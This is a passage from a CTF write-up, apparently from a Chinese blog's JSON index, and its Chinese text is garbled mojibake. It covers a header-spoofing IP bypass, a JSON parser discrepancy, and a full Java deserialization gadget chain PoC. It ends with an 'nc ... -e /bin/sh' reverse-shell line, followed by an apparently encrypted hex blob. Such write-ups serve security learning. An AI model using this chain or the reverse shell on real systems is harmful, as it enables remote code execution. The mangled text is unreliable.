sstiæ²¡æœ‰åšé™åˆ¶ï¼Œä½†æ˜¯ç”±äºç»è¿‡äº†â¼€å±‚htmlè½¬ä¹‰ï¼Œå¼•å·ç­‰ç¬¦å·å¯èƒ½æ— æ³•ä½¿ç”¨ï¼Œéœ€è¦â¼€äº›å…¶ä»– payload è¿˜è¦æ³¨æ„çš„æ˜¯ç”±äºåœ¨nginx.confæ–‡ä»¶ä¸­è®¾ç½®äº†é™æ€æ–‡ä»¶çš„ç¼“å­˜æ—¶é—´ä¸º30å¤©ï¼Œæ‰€ä»¥æ¯æ¬¡åœ¨X-Forwarded-Foræ ‡å¤´æ¢payloadçš„æ—¶å€™éƒ½è¦é‡æ–°æ³¨å†Œå¹¶ç™»å½•è´¦å· TellMeWhy?é¦–å…ˆç²—ç•¥åœ°è¿‡ä¸€ä¸‹é¡¹ç›®ç›®å½•ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„MyFilteræ–‡ä»¶ å¯¹è®¿é—®babyè·¯ç”±ä¸‹çš„ä»»ä½•è·¯å¾„éƒ½ä¼šè¿›è¡Œå¤„ç†ï¼Œæˆ‘ä»¬è·Ÿè¿›ctx.realIp()çœ‹ä¸‹realIpæ˜¯æ€ä¹ˆè·å–çš„ ç»§ç»­è·Ÿè¿›ï¼Œå‘ç°æ˜¯é€šè¿‡ä¸‹é¢è¿™ä¸ªæ–¹æ³•è·å–åˆ°çš„ public String getRealIp(Context ctx) String ip = ctx.header(X-Real-IP); if (Utils.isEmpty(ip) || unknown.equalsIgnoreCase(ip)) ip = ctx.headerOrDefault(X-Forwarded-For, ); if (ip.contains(,)) ip = ip.split(,)[0]; if (Utils.isEmpty(ip) || unknown.equalsIgnoreCase(ip)) ip = ctx.remoteIp(); return ip; å®é™…ä¸Šå°±æ˜¯æ§åˆ¶ X-Real-Ip å¤´æˆ–è€… xff å¤´ï¼Œè¿™é‡Œåˆ¤æ–­çš„ æ¡ä»¶æ˜¯æœ¬èº«ä¸ä¸º 127.0.0.1 ä½†æ˜¯ dns è§£æåæ˜¯ 127.0.0.1ï¼Œæœ‰ä¸€å¤§å †ï¼Œè¿™é‡Œæ‹¿ä¸ª localhost åŠ åœ¨ä»»æ„ä¸€ä¸ªè¯·æ±‚å¤´ä¸Šå°±ç»•è¿‡äº† è®¿é—®babywhyè·¯ç”±ï¼Œå…¶ä»£ç åœ¨HomeControllerä¸­ @Mapping(/baby/why)@Postpublic String why(Map map, Context ctx) throws Exception if (map.containsKey((Object)null)) return èººé˜´æ²Ÿï¼think moreï¼; else System.out.println(map: + map); System.out.println(map.size()); System.out.println(ctx.body(): + ctx.body()); JSONObject jsonObject = new JSONObject(ctx.body()); System.out.println(jsonObject.length()); if (map.size() != jsonObject.length() jsonObject.has(why) jsonObject.length() 8300) String why = jsonObject.getString(why); byte[] decode = Base64.getDecoder().decode(why); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decode); MyInputObjectStream myInputObjectStream = new MyInputObjectStream(byteArrayInputStream); TangYingGouModel tyg = (TangYingGouModel)myInputObjectStream.readObject(); myInputObjectStream.close(); String yourName = tyg.getYour_name(); return MVPï¼MVPï¼MVPï¼ + yourName; else return æ‘˜ä¸€æœµèŠ±ï¼Œé€ç»™å¦ˆå¦ˆï¼Œå¦ˆå¦ˆï¼; è¿™é‡Œå°±éå¸¸çš„é˜´é—´äº†ï¼Œè¿™é‡Œéœ€è¦é€šè¿‡jsonçš„è§£æå·®å¼‚æ¥è¿›è¡Œç»•è¿‡map.size() != jsonObject.length()åˆ¤æ–­ é„™äººåœ¨ä¸æ–­çš„è°ƒè¯•è¿‡ç¨‹ä¸­å§‹ç»ˆæ²¡æ‰¾åˆ°mapæ˜¯æ€ä¹ˆputè¿›å»çš„ï¼Œæ‰€ä»¥å°±ç›´æ¥å¼€å§‹çœ‹JSONOjectçš„åˆå§‹åŒ–å»äº† é¦–å…ˆæˆ‘ä»¬å…ˆæ™®é€šåœ°ä¼ ä¸ªjsonæ•°æ®è¿›å» why:111,why1:222,why2:333 ç„¶åç›´æ¥è·Ÿè¿›JSONObject jsonObject = new JSONObject(ctx.body());ï¼Œè·Ÿåˆ°å¦‚ä¸‹æ‰€ç¤º ä¾¿æ˜¯åœ¨è¯¥æ–¹æ³•ä¸­å¯¹ä¼ å…¥çš„jsonæ•°æ®è¿›è¡Œå¤„ç†ï¼Œå…·ä½“è¿‡ç¨‹è¿™é‡Œå°±ä¸å†™äº†ï¼Œä½†ä¸€ç›´è°ƒè¯•ä¸‹å»çš„æ—¶å€™æˆ‘ä»¬ä¼šå‘ç°å¤„ç†æ˜¯åœ¨ä»€ä¹ˆæ—¶å€™ç»“æŸçš„ åœ¨æ¯å¤„ç†å®Œä¸€å¯¹é”®å€¼å¯¹ä¹‹åï¼Œéƒ½ä¼šå¯¹æ¥ä¸‹æ¥çš„å­—ç¬¦è¿›è¡Œåˆ¤æ–­ æ˜¯ä¸€ä¸ªswitchä»å¥ï¼Œå…¶ä¸­ä¸€ä¸ªcaseæ˜¯å½“ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯çš„æ—¶å€™ï¼Œä¼šç›´æ¥è¿”å› okï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„ç‚¹äº†ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦åœ¨ä¼ å…¥çš„jsonæ•°æ®ä¸­æ’å…¥ä¸€ä¸ªï¼Œé‚£ä¹ˆå°±ä¼šç›´æ¥åœ¨é‚£é‡Œç»“æŸå¯¹jsonæ•°æ®çš„å¤„ç†ï¼Œè€Œä¸ä¼šç»§ç»­å¤„ç†ä¸‹é¢çš„é”®å€¼å¯¹ï¼Œä»è€Œé€ æˆäº†mapä¸jsonObjectä¹‹é—´çš„é•¿åº¦ä¸åŒï¼ŒæˆåŠŸè¿›å…¥ifä»å¥ why:111,why1:222,why2:333 é‡Œé¢æ˜¯ç”¨é¢˜ç›®è‡ªå·±å†™çš„MyInputObjectStreamç±»å¯¹è¾“å…¥æµè¿›è¡Œä¸€ä¸ªååºåˆ—åŒ–ï¼Œåœ¨è¿™é‡Œé¢å­˜åœ¨ä¸€ä¸ªé»‘åå• String[] blacklist = new String[]javax.management.BadAttributeValueExpException, javax.swing.event.EventListenerList, javax.swing.UIDefaults$TextAndMnemonicHashMap; è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨XStringæ¥ç»•è¿‡å¯¹BadAttributeValueExpExceptionå’ŒEventListenerListçš„é™åˆ¶ ï¼ˆè¯¦è§https://cina666.github.io/2025/02/13/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/ï¼‰ é¢˜ç›®çš„fatjson2å’Œjavaç‰ˆæœ¬éƒ½æ¯”è¾ƒé«˜ï¼Œæ— æ³•åˆ©ç”¨Idapæ¥æ‰“ é¢˜ç›®ç»™çš„MyObjectå’ŒMyProxyä¹Ÿä¸ä¼šç”¨ï¼ŒçŸ¥é“åŠ¨æ€ä»£ç†ä½†ä¸çŸ¥é“å…·ä½“è¦æ€ä¹ˆæ“ä½œ æ¯”èµ›ç»“æŸåå¼€çœ‹å­¦é•¿çš„wpï¼Œç»™äº†ä¸€ç¯‡å¾ˆæœ‰æ„æ€çš„æ–‡ç« ï¼šhttps://cn-sec.com/archives/3620965.html#google_vignette é‡Œé¢å°±æœ‰å…³äºåˆ©ç”¨åŠ¨æ€ä»£ç†ç»•è¿‡é«˜ç‰ˆæœ¬fastjsonçš„éƒ¨åˆ† çœ‹åˆ°ä¸‰å±‚åŠ¨æ€ä»£ç†ï¼Œspring-aopé“¾ï¼Œæƒ³èµ·äº†æˆ‘ä¹‹å‰å†™è¿‡ä¸€ç¯‡æ–‡ç« æ¥åˆ†æysoä¸­å…³äºspringçš„é“¾å­ï¼Œå°±æ˜¯ä¸‰å±‚åŠ¨æ€ä»£ç† damnï¼ï¼ï¼å½“æ—¶çœ‹åˆ°getObjectæ–¹æ³•çš„æ—¶å€™æ€ä¹ˆæ²¡ååº”è¿‡æ¥ã€‚ã€‚ã€‚ ï¼ˆå¦‚æœä¸æ˜¯å¾ˆç†è§£é“¾å­çš„ä¸‰å±‚åŠ¨æ€ä»£ç†çš„å¯è§æ–‡ç« ï¼šhttps://xz.aliyun.com/news/17923ï¼‰ é‚£ä¹ˆå‰©ä¸‹çš„è¦åšçš„å°±æ˜¯ç¨å¾®ä¿®æ”¹ä¸€ä¸‹ä½œè€…çš„pocäº†ï¼Œå°†åŸpocä¸­çš„badAttributeé“¾æ¢æˆ XString çš„é“¾ï¼Œç„¶åæŠŠ MyProxy å’Œ MyObject ä¿ æŒåŸåŒ…ç»“æ„ï¼Œåœ¨é¢˜ç›®é‡ŒæŠŠä»£ç  copy è¿‡æ¥ï¼Œå†æŠŠåŸæœ¬æ˜¯ ObjectFactoryDelegatingInvocationHandler çš„åœ°æ–¹æ¢æˆ MyProxyï¼ŒåŸæœ¬æ˜¯ ObjectFactory çš„åœ°æ–¹æ¢æˆ MyObject å°±è¡Œ ä¸‹é¢å°±åªè´´å¯¹Fastjson4_ObjectFactoryDelegatingInvocationHandlerä¿®æ”¹åçš„å†…å®¹ import com.sun.org.apache.xpath.internal.objects.XString;import common.Reflections;import common.Util;import gadgets.*;import org.example.demo.Utils.MyObject;import org.example.demo.Utils.MyProxy;import org.springframework.beans.factory.ObjectFactory;import javax.xml.transform.Templates;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class Fastjson4_ObjectFactoryDelegatingInvocationHandler public Object getObject (String cmd) throws Exception Object node1 = TemplatesImplNode.makeGadget(cmd); Map map = new HashMap(); map.put(object,node1); Object node2 = JSONObjectNode.makeGadget(2,map); Proxy proxy1 = (Proxy) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]MyObject.class, (InvocationHandler)node2);// Object node3 = ObjectFactoryDelegatingInvocationHandlerNode.makeGadget(proxy1); Object node3 = Reflections.newInstance(org.example.demo.Utils.MyProxy, MyObject.class,proxy1); Proxy proxy2 = (Proxy) Proxy.newProxyInstance(Proxy.class.getClassLoader(), new Class[]Templates.class, (InvocationHandler)node3); Object node4 = JsonArrayNode.makeGadget(2,proxy2); Object node5 = getXString(node4); Object[] array = new Object[]node1,node5; Object node6 = HashMapNode.makeGadget(array); return node6; public static HashMap getXString(Object obj) throws Exception //objä¼ å…¥å¾…è§¦å‘toString()çš„ï¼Œå¯æ ¹æ®å®é™…æƒ…å†µæŠŠXStringæ¢äº†ï¼Œç”¨æ¥æ¥ä»»æ„equals XString xstring=new XString(); HashMap hashMap1 = new HashMap(); HashMap hashMap2 = new HashMap(); hashMap1.put(zZ,obj); hashMap1.put(yy,xstring); hashMap2.put(zZ,xstring); hashMap2.put(yy,obj); HashMap hashMap = new HashMap(); hashMap.put(hashMap1, 1); hashMap.put(hashMap2, 2); setHashMapKey(hashMap,hashMap1,hashMap1);//é¿å…æå‰è§¦å‘æŠ›å¼‚å¸¸å¯¼è‡´ç¨‹åºæ— æ³•ç»§ç»­è¿›è¡Œ setHashMapKey(hashMap,hashMap2,hashMap2); return hashMap; public static void setHashMapKey(HashMap hashMap,Object oldKey,Object newKey) throws Exception Field tableField = HashMap.class.getDeclaredField(table); tableField.setAccessible(true); Object[] table = (Object[]) tableField.get(hashMap); for (Object entry: table) // System.out.println(entry); if (entry!= null) Field keyField = entry.getClass().getDeclaredField(key); keyField.setAccessible(true); Object keyValue = keyField.get(entry); if (keyValue.equals(oldKey)) setField(entry,key,newKey); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field; try field = c.getDeclaredField(fieldName); catch (Exception e) field = c.getSuperclass().getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static void main(String[] args) throws Exception Object object = new Fastjson4_ObjectFactoryDelegatingInvocationHandler().getObject(Util.getDefaultTestCmd()); Util.runGadgets(object); å°†å…¶ç”Ÿæˆçš„ç»è¿‡base64ç¼–ç çš„å­—èŠ‚ç ä¼ è¿‡å»ï¼ŒæˆåŠŸå¼¹çª— æœ€å nc å¼¹ shell æˆåŠŸ nc xx.xx.xx.xx 7890 -e /bin/sh","categories":["Write-Up"]},{"title":"JSä¸­APIæå–&å‰åç«¯åˆ†ç¦»æ¸—é€ã€swaggerã€druidã€actuatoræ·±å…¥","path":"/2025/07/10/JSä¸­APIæå–-å‰åç«¯åˆ†ç¦»æ¸—é€ã€swaggerã€druidã€actuatoræ·±å…¥/","content":"0c239692b5fdf341fc97cf04ee2985d069b9636753dfdfe8594e470a92c95898034edf6599fbf5ac3f8caff8f0d53aa1efc7dbfad2e551f8aef1986fb62b0e2c4719bad78a2ccc3271fa4a591ea89057b7ae669929239d5567fe142931716417c16ca6c3be2fa7bef8f5552ad4981f2ac836b250abc589509fdbb230324a7b1fbd9c3ee1f43b53f88b57331dc4c8688f2097eff5133fe73ba635acd4ad1cdc7523b6ca57418eed348ee64b103467fccccbd3d2b3cdc52e8cd2c2254c69bb3cee367b82d4f0e9e3c6f99b1574fc3ac8685d286de0f8dda324b1229ecc4f17282c94f25160ffb407332d44b241f2785e2d661e92a3911dda364232b3aff072e671ae3aa3efd71f125cd744370c54e9e9562097ed214224a1868368a3383e6a52aa0ef6107f36a422f6329744d5dd663b6962839b22808fb5c1974d2ea8f1d18db264e72880ad1e82857fb7dd394d12d1a4d3e597a63f8b2e5113821da74e306bde0057dc9f8945a93009ad1a534eea694e62325f0a7e0c9a0a5abca74c7a65587b258f312771467a06ab8e964633c9c5b9f4647f3a8030b99952b82858bd5726d2a3eaebc212121cf3441ffd6ad86485100504d11a4a766f5c630291b1870910c7b9c9dfc2b0e8816d40d10665cdbf43f005a8d42152feb90df02477fc2a4d40b1ca54b0ed595b28ebe7e6294eec5156086472041892e561841f6d5fd82687b9030ab1de7cb177de0b54588b3db3d8b59be1787554b280c155cb72a5c4aae9c82a549136ecb6ed05aebb50648d1501b23fe847f8a06f13e680a4258e63f164a3aa6c9b83f27a84c5766ff8d68a5bfcab2c40751945285d4473b9a7ad9a9ea61cbe05d79af5b4762f92bbd12a77833c2b32f50ec826efba43ee0ef75f2bd5a6b49cb4125ddbeae94a4f89d7f28d3ee7e67a1a079a31150323058fba493bbc173bf33d74a4cf0e81de83e4a1613aded30a41bfc3d9175085cad6afa0d7d2a229144cbe7d9f9d5f649aa1978683f755c6cd9571f69ee42287656fc8b30d178332b94e0974eb027dfc9db20d2c4d6e7546ae224493372f119235fe874e998574b83a9a0a62553005ddcb0fe0ae65f3be741360e76a3f57c844429abba7c82eb28feb245c8334ce2065aa4b46a96da973f981e57746bbae0ddf49a0e0c5f0f853b2a606f10d9d311a54573002de38266328823b72d5f5af841c1fbfffb1bffcd3c58f8c3a3514e48d5c05d3023c7dcd2ca9f4fb4d79be07dad6f5757c17116b60f5f3682af29f4c19e5dfbc00155bb6373273f220273a4c146d30504fb8e935caa118dc86a5d8e115b2723eddda79f3bcd0fd22fcabd50d21bf9929de33ee719fbbcdb6b78a9fda20288826550f34dade36024acdb7437e6f22bba5297525fe0bd02e6a52f5d70314322b3b3602ffd836eabc385a98a0d7c0ffbc452adaca46639af26f9db5d35739895ee7e85dd67afa41b423d3516007709ab9622607490e8a246ca3242f694362e879b326de7d030d974d801917544f77665de1c7acfe6d468eaf737a072dd9ae3292de2a7e5439ac77c41df35824e7684b07d61358849097f1bb39be385eef193bf16223c3e1dd19fccddf77ba8b0a7775c5d6d2ecf65fc8e83f699d287bf580c569b21a1f01ad6fc9b4d4ddf9ce84f72515dde5a1c82b44875fa974f8fb667d2bc127338a46dc3acc5ef4bf38238dd73f07468243eb5b8c915ce16639df69ffcb72945fd366ba475dd44db1ca204892905f081d1d1c775c9b288f2ca0e7fd7ef07f73c1772e437cb23041ae8d91b4660d550d9b5bc396c94a59bda877677ac0dc689e2f0d39077ee5b4d38c8eac90fd435ed785ef3968fc833237d5cfee2cdd33a2c59fc8d46783bfeccb353abe1b16070b9d3b780d8ced93d7f68a0e69cb70a54fabf58b7a5b3ce3061275547dc0ac408ddec49a21fb2fafbf6827a7eeb74e12052197a2e0d7cb3031e41f443fb8c7020b32455cdb2031c445a80c91389f97e84be86e3f00f83e23e8f2c7865a8817059eb7fae22e4a5805b4c1c073fb1997fceb97803dfc78a6861f574d35e48e9bdaf761dec9b672dc9fdb2934f65a8ad7c91b0185b5c0fdf8cb5aae1e2755ccf97c388b0fdb00e52f9fc9dbd3e7d27267dbbc73b87f44d23753ffeb2715fe21d6a02c967c693237512188d2d7608ddf62a54a7e3ad1b6d69375a094b12946c7af701fa28d56a8c3370f8acc1e38db8681008a111398c1245934d3c31e5c071c7024e6410fcd1dd75515194690cf34de903332b7d839a1d09299564f63c37945d1d733dc0e9ef8af22f63ff893d5b170bb03549066e487fbacb09ef4e81b38c65c28ef1b029ceb5b19b6d3d3462ebe87981dabd178c5cfa3a9d8734b118f882d1b6775eae36f5077c4aa7a3fee665166a1d1ee9a306a57d71958bc0f91388a64c9121dd9139aee782d72645404fcfc15cc27903d5cb9451be05b93b5f13dcf2c46e23ee478c5fedf9cc63eba4b32cac03fdb52615911206aa86b10be3de9d1698f936594d6952b6233db41bed4fdd686e302bf6882a0bd836560154a443144529a9f79e3da2018eb88f0cc5883bcf2826ea3bba31fd46e70d103fda0523578991d07bbf4f0140464aa0d4f22464617820b4fc1bbf85277b4e2d4f340450098c6ba94f19bd1d8e0110c2abb013ab715ec03d3db00294e328b31e6fca83d06521f629eb3a97d290d6cb9d176c434186c773182ec79818bec0a31ef1366952eaf2f64c0ba661e604b5d124896031fc9004fa90a9a06d01d5f4f9a2996e9807e38fad1778264fa848443bf211f83295750c4404338f8172e73f7e45945d58b404bee7f170129eb084420d8346615dc54ded892021a9db154db295d3d0dcca58f3fc3749904657371ef232cce32ec768d5242d29b48882d801f2b68419050f65ffda6a19ca703b43be502b00f1cd5b4e391175a5d8a403be4895f8a2ef118b04a19129cd7f058da60d8b6155a7dd0ba244716a2f74b5b3d2e7d6a7aaa664745da00095a6d9767f25519cab877d23a931f84e96e7dc0dbd615ce6a6ce0f2b388fca48a0a596eaf34c28a9b34408a33583ee2f4e21526978723ac52e6d47494e8db54134d42c03874266768a1a41b530c232d82e59bece2ed96672e49a789671540420b2f9867783e8e81ea51f03278f282813a98c86a3bd60abbef40c0731122f881f915d8c118230d8adcf02490fd1a22a440009c22bb25aed80e7efdc1ca8108e3b731b8332daa3c9170bf2bf5fff0aaa8cfec88ea9787d3c5cb86b1851c1f70dc908dc5072979688ec3ef29753d81f84126011aeeb1ff41216f127245d412c63d4dc7c13316132a36b851d9b656e490b4b7abc13e8b91ddf82de2b462bc1d860b42b61c85a8de9bd0481b93a0249c8e2cbe6cbd21475e5e217ee22db7b3642cdc6749e985f5d3128de9f137e808c3fc9e0553401c4ce250e4185ce8f1a0e27c5cb1d2328dd9e96c29b289491cdf6b598cb3f1766864333db3fe76e2a68fa4f46d8feee2c9403912f20add3e7901f0a9cdb5d5cc42d2f3435cf3b6ca2b859a5a275fa8afb1fb960674b49e3e24c307f1415fba621d24b4c852ed44044dd93e909cc18a2f07cf6345f126147c3086425f4a257ffeeacc0b71b9aab363b88f14c2871a45bc2a29e5da3275d8fd6fa343adde3271773d4cef35e00d5dd6b5dbc07963624f91e8856755a32ee2b0600c824fcc93873f795a480ef3d5299398fe1ee2407d455798f41846dd4186cbdcd09c810ef8c6e997a1fb808cdc3964b09f34ed0aa171ec52f60cfaf031fcbe1ff8ad30b52f098531ce8c75a856646ba3736faf97df256c2c42566b66d9d03e41cc5b6dfc2d2c7cb798cb417a40ff1cc4d28fdaa6abc5d3d373538cbfd871f921ad1aa1be61a16f241f47a5d73bda199d21e7ff59e3db397910b68b55782074f6bf42d0fdb5a319d486e59a3712368161585371d51a12030cafceb1cf6fa114a907aafcf71752171165fca62bc5b2418e46021a8b9407d140a97ecd890648231a63645a7ce94193d4f4974948968d557ca8e290efea1034ad8f1844c925c7583093157bd0b5e6db63a352b9195d57283d4e0d33abda28569d6385e533fdd824f9104907a07671fb9ef3f1be043c4becb1256b1e33d5a29ac570e53348de780a6ebbcc80ea6c7152434299c68ed7b0254fd2eeead6a8089cbdcb0cdbbbed4a968be17a60e8021b88e5a9a4d740e1729b9b66a892b7e0a273c8cbcce6273d520626ec285be48b1f97999989139d1c08865c42cc7f34d4a168f6c42c15b76cc85d6d966640d04a2857bd9f03a7433ae5b80c2e009801e227147eeef7a58788e662d18c60adf9823d9f09cc739f36e5b689030e638a93a00242b41b20da7a2593a13b15b0a4357a7f98569d9e48c2dbe677fa01d2227e43a0f30fba844cad571b138383af5034a4ca73fdc2cd004c7310a9cfe520f0daca67956d8111326d826926e4f69b2f4eee686acd50028da71ccbf8af6b9ea36e29e7c23d24d3c5f53b71e076b213f5fa7e115871a0dd1e55e029c09d700dcb387f7af9ca6f23bb2294d56183799c79da82789f98e717cea9fff44aad2e6f5e109f0e12f29ebda1081fa840b44df81a17158bf5b5adb33a7df65b54cccfe93ea787040f141272a29aa9f899ee2534b044e794a52277bb135da1381f834a621f878fef451991244f79fc014aa513aff6565f839d52ec101ed01bc6d721e82c1051a207578f1be31eeae96ce3ba385dfb8f4894d746a91a108ed6d395ba97eb67f1119e7dbacb00512f99aa80186c188d807cddaf2dde2cbea7ec436d077bb51cefffab603e35e696827714023ed438a18992f02a5ce1e9e5383df5a62bb268e9bfca5d45dbff574df9997d3d1103159f2f9f3ee023eed32dd37ef83dc8aa17d0f9c41613b3adf000885843754dbc9c7fd1453db30b767d820034ca4bc22f3f19fc901c2173f1af731d9ace543dae3e7c5d5c02f918f398a38912c0fc6ba6fcda407c5f2e74fec6876f74076f87ae20f395b56d998bbd70d78452ffa3d27a01804052c7fb539b72318f5bece4af035c36216af009621ad48cf7b09d22f056b1b2f5e6084ebae440f3bddf53c5e004744157fc290baa5f55cf8dfbb67a9c7ccef9aab754d495a9d174ee6bffb818fe5d24d076db84a6cae1d0a5ef25d35b3f0030fea009eedc952f3e8c9e981e42da45f9674ae0fafde4a05b514b15d0a744f5944b29211a4360333896dea2bb7085a660bd6616ea685e0ed4616dcd1bd84e0a08b2a3765f0dd7250fc6e4a125418fbe48fa75e2d17454014478353a7c83c362b8aa4d5f5ef2ffba4857170bd51eca9c69fbb3dc90810076239a56420794c50604c20f85384d2bb05674839a6b115277a3897923a1c5cbe1e2c954eca5ff65d6abed3a539c0eefb2602306d3ab2c4c23d84f4c2a1f2b729f0430aa7f9ebb66cab79562b6eb217b7ad4686da71c2100fb2d6d1178e9f4f8938841b4cd7465966623212def1e9ead3fa318bd2e3d7da6336fb9eb3fb5fd334cb95edb2c9f1625bcdf5deb2bf3cd9b2ff06b50ee60a2aebd80f92c60787141cc7c1311707323ff5a538d941c956a22e6e81cfc2bbddff34139eab6a56b2f0bf23782b817ff5ca911dc9275c6ef31879b34cdca02ed9a3d8968fd264062e8bf1f70d7c86164d260daf0208ab30d31f3237201317c4d8f795f34afc55b02e9ddc99d7db0e2184b16b0f1bc26eeab454642d38293a268fee6a515415b590d9cdf02a3c46dae258b2a6a26a817150a97e95f42d25f95f80f5dd5637281ac741cc860a49f584812ffdd6018d4963b12062345b68aaa4d98d735cf56268922f40b47686949b25bb9aaa7c8badcc527d7233b9515a1955a9d3c2d1054e938ddf61bf966e161776c876c76cffb1fe98fb5533e9d32b5b499c2f1503b099a6eae228c28ba8497e009a2f628cda5336afe643cd235c4a637a3b2f39b9ec62604657c73f2c2ca8f241ddb0b95d0b6ddc281cafe7ecff73cfa80580a873ef4d25670a5826180e0388bbc95767321e6bb0c88c64f4c537bccf12a72cd96ea0ba1e708f858624c37a457f46048fd4f8962e8b3a1538668f26a2e795f82ac7d7cfaa30954d8a7ed4e67722172627de2b31725ee722c33d4b189f1043e372948a2d43c4dadcaf1d996ac9464eabf6e4f5eff048f9e95ad3c9988779b78b9d5a35e4cf645018e9be8a6bbfdb313c5fce2cff1f7534ad0152d54703407f4943833b76ef18bbe853b42e1220c9d21ed777332fde2b4937e865e8b48ebe08668e8d84fb1ffb6c5e88e72e51e049911276fb3e7f6ed5bbf96b1a9cffd6e57b59f75f91283e47c5e13a15e473ad70294faeae99018e063e2f8a1a9a498a2b7d7ebf1dadd0bbfa63fab83b09b2cf096b42790e5d49c0d349d73a8ee5f1df499643998f9c68e2a43f08ab0276e78732c41f541caf6a44fe46f3bf468f6b9bc51eb3386ae9d758a0697d9e29b726eb252767c6e80156858dbbab8bd4143b322aac2197bc28b8cae42ef6d41102d406178da25e21ca66c244ad37e24a00a04182c5d0da0894ff92720c04c7326cf7c5fe4233d875caf1cb64533a4018a1ab06c3f6c612c97b703376fbdbbec69f1358b0f0a917e00a3f8867e15da78a788b3019189df4a095b51fdd307e3f356aa55766262d0ed50532cdd0b7d94fccffc4d6d566021cdd782bc59a607080dd2f5594df0b6c08fcc972608f6658265c91c18de99507eb9c1d433c27fdcabb8871782addffdfbf7465f5fa0c7e092aead0f22b65e209f40f6d001cfed08d00b6337bd7a897d9546d7fedab9e0f231bf7123fa78613501eef4ea9085f1ede61ff8c0bfb16d2c568558873fc3bbb92f2bf286b9e1b78b3cb450114a0c83f13c7990f3f7521999063cfabebb608d94ee44a943560317ed1639a72cefd127422ed43831668f2eee22a1b20089ca304d00de56960bc93a38a4d53043cfa6a87143ec69920dc6f5ed7af18bd671b0c44224e65b17774ea2a3b7599be95889dca21e84d0550fb15c0e010f6852b81f4df93fbe41ac1b5e36d1c4e3021e7867b82ddb2827d6d5b214abe69982f3d9a9bb7f742e663279d8853a6b7db973a7087ef4544412d59ef2f1f3f4108e8705870413505aa216b70d7c4d1eb23edfdc162d477f70af1cc0bb4a439b9869fe83f89d84fd0926324da245e3327be9f396618d13578590fee67c52b8c5ebec026d3a450daa42a57ed81da2eb19e851cfa8e86050a6d7bab4b705d9663dd0e3c29d4444bfb64e389b6fb97f7b528dde008765603e6a4e33f0c3dc6008fe90a41e698592cd220afa8f69c44507a3e6ba357b022477a65b3270d1031c41b90f80244c81dec36e687272a058f556fc567885eab7c4d1f0aec8f370660503fb71f5b17696215410fcf6302e59a2672812a34113111654abee74f401613dc1b6f9110e9b067bdab33a224887b0eddeb9e0918e948dcdb8e2a8c62dcdd63506ff3568da701277c5103da44504711f725961d1babbb3dde5ce21dd74081a0a8680ec5545741886aacce1bb7b1b3c850633243c6c06ca6e8b51db8150560a6983ec2d15d624d26df323693da085694e8604a45ea952cd85ecb2b7eee9edc1e8e5a2bdf2fc01e51923d7c3e290da5a20d9027c1d19f4b924ee976b72e84b6a85644c5dc06e8f29795923ee73ae15cc5842816585ccce8a5fa4525f03037b9831033660e8b6b2aebac3d1a95b50fbf22557c60782a5664d5cbb306cfa2db3f4e3d59ebfa4e1733bf6880d2f5c010eb9a9eb42d247c237d0233ddc564493385251390c0c18822c3374be6f505dbd93b914ebedea027de5e6344b0546f95c5a98644181fed692c5b491f5c87807e7ca286aedd273e3bbc3b1eefdce82b7d2a68063d03c761b1a088cc551cca6e0e3e5452c2a4312cbb550920a96d881becf55090553dc6490e4886a962d9163a27596739a744d14508c4bfb0842cfe22de4a01b8d83982a82c70f7016f936b552016e022079a69c768ba4959273c0ac4685ecf1283937a369469a682391f37ba060bb17eb95cc2e11d1b65a45a821e61a947aa3cee4e07b4bec89e587c9a93f8b5c1289faae6e039d4bf3cecc441dfc08f8eeca5101e16e6a50e25f491f668dd0ff2286d8b995c64eafb0a63c9058e3186c970d2bc06d5f751067d6acc0d1b68673c9cd0137bd4edde0b7dc994f5b89d4a294a40c74600e44e7855405ee8d5a95237358cbcf5d066be012e1c7606a7e4d802fe399c8e487a9960c8d07044ce4538f343a19c21b7db63585c963d122f5d151355b41e8c39666845074e069d130b6bc308a516bc295e35641c849b499d2bfd031045e0cd21c54f02d200881dc2147498da5a6e18b721e73855160f0543525d28bd6b434a36438e7f2c96bbc67848147b4f43ba1da86d5bfe2aa8ede38cb40f76411bc9ee3a4d02a3a57ca3ed11e827e4495145d5a8a49e2a01f132ef5718b6b70304185c88899c9be62f6d6161e1afcdeef3b184ce0d1e2f5813fcca2292caa41f99d043cb90adab9a85fe1e982091ad432c9db9b3515a155cb98f0fd018173819b92c18c2a7e70ea7ae95e067c3a4b2b688af9b25ef93f4129ee7a7ef47aa8f063c6d6b3bafb3ea0e178d5341462b54dbefab10f48e668ac4c8e6a9f5388d54a4b4f4d764668a1c96109875d05efa821634f3b516e641e88a286c30a1902851d4f60e95c5e39d1eff3aaa9402065d77b5c96f1f6958a9fbaecf522925c66296021d6cdeb16cbf2b76915a07037a8625dc474df3a283881414530d076ddbbd1b3a9a314944c03fc8fc1a93bced3e3ec1237c6e4aaf56b57cf8ce59cd6a741e9dad8001c07c5e2d9f73971b1ed1e3c547f49ca3287a423731c14294bb905caffd7ab388897c70678d1a0442ea36c1bb0c516b57a7d756d375b78595bf87cb499f31c6849f51dacb86d65bf7eb313c25cf530d70e6c851f1aea5967df4531053ac60f8c128901949b15a692e2a4c14f754f700704075d30dea484c649036aebe3357dfda89fe5ac0325cb11b44d4aebec5421c0cb44577104076f3dd4303d168dd2f82bfc1750aee46ba5e94217edca505033a4c3176729cae658ce4cc13e44a2ea8f5857bd949ee8403c420d3a69cdc796b3c7936e421434d04a3d6eac1c856ad844fb1d2ee506583a91af13bc8bcbe89650a6561e0b247cea36decdf06d77812b4877c2786a890c9926e59bffd898a05836348c8de3f6087fbb6001ff53f93d03d90c1340a887db9eb6cdec2a1f20ed0208d828400a524dd104d851240c7186ea889d979755f0f58183769b4f82a373435c09c5b1f7a77dd6ecf5ce4632ff9d804f12cfa43df27d6dbb0e9f24a8f